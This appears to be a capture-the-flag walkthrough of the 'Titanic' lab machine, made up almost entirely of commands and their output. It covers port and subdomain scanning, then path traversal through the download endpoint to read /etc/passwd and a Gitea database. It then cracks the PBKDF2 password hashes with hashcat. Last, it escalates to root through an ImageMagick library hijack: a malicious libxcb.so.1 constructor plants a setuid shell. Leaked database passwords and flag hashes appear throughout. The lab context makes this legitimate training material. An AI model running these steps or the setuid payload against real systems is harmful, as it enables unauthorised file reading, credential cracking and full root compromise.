@@ -1,0 +1,293 @@
+--------
+Titanic
+--------
+
+sudo nmap -n -Pn 10.129.231.221 -p- -sCVS -A --min-rate 10000
+Starting Nmap 7.95 ( https://nmap.org ) at 2026-11-19 10:36 EST
+Nmap scan report for 10.129.231.221
+Host is up (0.0078s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   256 73:03:9c:76:eb:04:f1:fe:c9:e9:80:44:9c:7f:13:46 (ECDSA)
+|_  256 d5:bd:1d:5e:9a:86:1c:eb:88:63:4d:5f:88:4b:7e:04 (ED25519)
+80/tcp open  http    Apache httpd 2.4.52
+|_http-title: Did not follow redirect to http://titanic.htb/
+|_http-server-header: Apache/2.4.52 (Ubuntu)
+Device type: general purpose|router
+Running: Linux 5.X, MikroTik RouterOS 7.X
+OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
+OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
+Network Distance: 2 hops
+Service Info: Host: titanic.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 111/tcp)
+HOP RTT     ADDRESS
+1   7.14 ms 10.10.14.1
+2   7.92 ms 10.129.231.221
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 14.85 seconds
+--------------------------------------------------------------------------------------------------------------------------------
+
+ffuf -u http://titanic.htb/   -H 'Host: FUZZ.titanic.htb'   -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt   -ac -t 20
+
+dev                     [Status: 200, Size: 13982, Words: 1107, Lines: 276, Duration: 11ms]
+--------------------------------------------------------------------------------------------------------------------------------
+
+echo 10.129.231.221 titanic.htb dev.titanic.htb | sudo tee -a /etc/hosts
+--------------------------------------------------------------------------------------------------------------------------------
+
+gobuster dir -u http://dev.titanic.htb -w /usr/share/wordlists/dirb/common.txt -x txt,html,zip,php -t 20
+
+/admin                (Status: 303) [Size: 38] [--> /user/login]
+/administrator        (Status: 200) [Size: 19998]
+/developer            (Status: 200) [Size: 25151]
+/explore              (Status: 303) [Size: 41] [--> /explore/repos]
+/favicon.ico          (Status: 301) [Size: 58] [--> /assets/img/favicon.png]
+/issues               (Status: 303) [Size: 38] [--> /user/login]
+/notifications        (Status: 303) [Size: 38] [--> /user/login]
+/sitemap.xml          (Status: 200) [Size: 285]
+/v2                   (Status: 401) [Size: 50]
+--------------------------------------------------------------------------------------------------------------------------------
+
+default tickets http://dev.titanic.htb/developer/flask-app/src/branch/main/tickets
+{"name": "Rose DeWitt Bukater", "email": "rose.bukater@titanic.htb", "phone": "643-999-021", "date": "2024-08-22", "cabin": "Suite"}
+{"name": "Jack Dawson", "email": "jack.dawson@titanic.htb", "phone": "555-123-4567", "date": "2024-08-23", "cabin": "Standard"}
+--------------------------------------------------------------------------------------------------------------------------------
+
+docker-configs http://dev.titanic.htb/developer/docker-config/src/branch/main/gitea/docker-compose.yml
+
+version: '3'
+
+services:
+  gitea:
+    image: gitea/gitea
+    container_name: gitea
+    ports:
+      - "127.0.0.1:3000:3000"
+      - "127.0.0.1:2222:22"  # Optional for SSH access
+    volumes:
+      - /home/developer/gitea/data:/data # Replace with your path
+    environment:
+      - USER_UID=1000
+      - USER_GID=1000
+    restart: always
+
+
+http://dev.titanic.htb/developer/docker-config/src/branch/main/mysql/docker-compose.yml
+
+version: '3.8'
+
+services:
+  mysql:
+    image: mysql:8.0
+    container_name: mysql
+    ports:
+      - "127.0.0.1:3306:3306"
+    environment:
+      MYSQL_ROOT_PASSWORD: 'MySQLP@$$w0rd!'
+      MYSQL_DATABASE: tickets
+      MYSQL_USER: sql_svc
+      MYSQL_PASSWORD: sql_password
+    restart: always
+--------------------------------------------------------------------------------------------------------------------------------
+
+developer@titanic.htb
+----
+
+GET /download?ticket=/etc/passwd HTTP/1.1
+Host: titanic.htb
+Cache-Control: max-age=0
+Accept-Language: en-US,en;q=0.9
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://titanic.htb/
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive
+
+HTTP/1.1 200 OK
+Date: Fri, 20 Nov 2026 07:38:29 GMT
+Server: Werkzeug/3.0.3 Python/3.10.12
+Content-Disposition: attachment; filename="/etc/passwd"
+Content-Type: application/octet-stream
+Content-Length: 1951
+Last-Modified: Fri, 07 Feb 2025 11:16:19 GMT
+Cache-Control: no-cache
+ETag: "1738926979.4294043-1951-393413677"
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+
+root:x:0:0:root:/root:/bin/bash
+...
+developer:x:1000:1000:developer:/home/developer:/bin/bash
+...
+
+GET /download?ticket=/home/developer/user.txt HTTP/1.1
+Host: titanic.htb
+Cache-Control: max-age=0
+Accept-Language: en-US,en;q=0.9
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://titanic.htb/
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive
+
+HTTP/1.1 200 OK
+Date: Fri, 20 Nov 2026 07:43:30 GMT
+Server: Werkzeug/3.0.3 Python/3.10.12
+Content-Disposition: attachment; filename="/home/developer/user.txt"
+Content-Type: text/plain; charset=utf-8
+Last-Modified: Thu, 19 Nov 2026 15:33:55 GMT
+Cache-Control: no-cache
+ETag: "1795102435.96313-33-1893075274-gzip"
+Vary: Accept-Encoding
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Length: 33
+
+fee23b2d3d0357d717d88421ce68f5d8
+--------------------------------------------------------------------------------------------------------------------------------
+
+curl 'http://titanic.htb/download?ticket=/home/developer/gitea/data/gitea/gitea.db' -o gitea.db
+--------------------------------------------------------------------------------------------------------------------------------
+
+sqlite3 gitea.db
+---
+
+sqlite> .tables
+
+access                     oauth2_grant
+access_token               org_user
+action                     package
+action_artifact            package_blob
+action_run                 package_blob_upload
+action_run_index           package_cleanup_rule
+action_run_job             package_file
+action_runner              package_property
+action_runner_token        package_version
+action_schedule            project
+action_schedule_spec       project_board
+action_task                project_issue
+action_task_output         protected_branch
+action_task_step           protected_tag
+action_tasks_version       public_key
+action_variable            pull_auto_merge
+app_state                  pull_request
+attachment                 push_mirror
+auth_token                 reaction
+badge                      release
+branch                     renamed_branch
+collaboration              repo_archiver
+comment                    repo_indexer_status
+commit_status              repo_redirect
+commit_status_index        repo_topic
+commit_status_summary      repo_transfer
+dbfs_data                  repo_unit
+dbfs_meta                  repository
+deploy_key                 review
+email_address              review_state
+email_hash                 secret
+external_login_user        session
+follow                     star
+gpg_key                    stopwatch
+gpg_key_import             system_setting
+hook_task                  task
+issue                      team
+issue_assignees            team_invite
+issue_content_history      team_repo
+issue_dependency           team_unit
+issue_index                team_user
+issue_label                topic
+issue_user                 tracked_time
+issue_watch                two_factor
+label                      upload
+language_stat              user
+lfs_lock                   user_badge
+lfs_meta_object            user_blocking
+login_source               user_open_id
+milestone                  user_redirect
+mirror                     user_setting
+notice                     version
+notification               watch
+oauth2_application         webauthn_credential
+oauth2_authorization_code  webhook
+---
+
+select name, email, passwd, passwd_hash_algo, salt from user;
+
+administrator|root@titanic.htb|cba20ccf927d3ad0567b68161732d3fbca098ce886bbc923b4062a3960d459c08d2dfc063b2406ac9207c980c47c5d017136|pbkdf2$50000$50|2d149e5fbd1b20cf31db3e3c6a28fc9b
+developer|developer@titanic.htb|e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56|pbkdf2$50000$50|8bf3e3452b78544f8bee9400d6936d34
+---
+
+echo 'sha256:50000:i/PjRSt4VE+L7pQA1pNtNA==:5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO/F2+8wvxaCYZJjRE6llM+1Y=' > hash
+---
+
+ hashcat -m 10900 hash ./rockyou.txt --force
+ ---
+
+hashcat -m 10900 --show hash
+sha256:50000:i/PjRSt4VE+L7pQA1pNtNA==:5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO/F2+8wvxaCYZJjRE6llM+1Y=:25282528
+---
+
+username: developer
+password: 25282528
+--------------------------------------------------------------------------------------------------------------------------------
+
+/opt/scripts$ cat identify_images.sh
+
+truncate -s 0 metadata.log
+find /opt/app/static/assets/images/ -type f -name "*.jpg" | xargs /usr/bin/magick identify >> metadata.log
+----
+
+find /opt/app/static/assets/images/ -type f -name "*.jpg"
+
+/opt/app/static/assets/images/luxury-cabins.jpg
+/opt/app/static/assets/images/entertainment.jpg
+/opt/app/static/assets/images/home.jpg
+/opt/app/static/assets/images/exquisite-dining.jpg
+--------------------------------------------------------------------------------------------------------------------------------
+
+/opt/app/static/assets/images$ ll
+
+total 1288
+drwxrwx--- 2 root developer   4096 Feb  3  2025 ./
+drwxr-x--- 3 root developer   4096 Feb  7  2025 ../
+-rw-r----- 1 root developer 291864 Feb  3  2025 entertainment.jpg
+-rw-r----- 1 root developer 280854 Feb  3  2025 exquisite-dining.jpg
+-rw-r----- 1 root developer 209762 Feb  3  2025 favicon.ico
+-rw-r----- 1 root developer 232842 Feb  3  2025 home.jpg
+-rw-r----- 1 root developer 280817 Feb  3  2025 luxury-cabins.jpg
+-rw-r----- 1 root developer    442 Nov 20 08:56 metadata.log
+--------------------------------------------------------------------------------------------------------------------------------
+
+use https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-8rxc-922v-phg8
+
+gcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+__attribute__((constructor)) void init(){
+    system("cp /bin/sh /tmp && chmod u+s /tmp/sh");
+    exit(0);
+}
+EOF
+---
+
+ls -lah /tmp/
+total 204K
+...
+-rwsr-xr-x  1 root      root      123K Nov 20 09:17 sh
+...
+
+/tmp/sh -p
+---
+
+cat /root/root.txt
+9fbab6c6198bc7650c58ee0110a3ce94
+
+
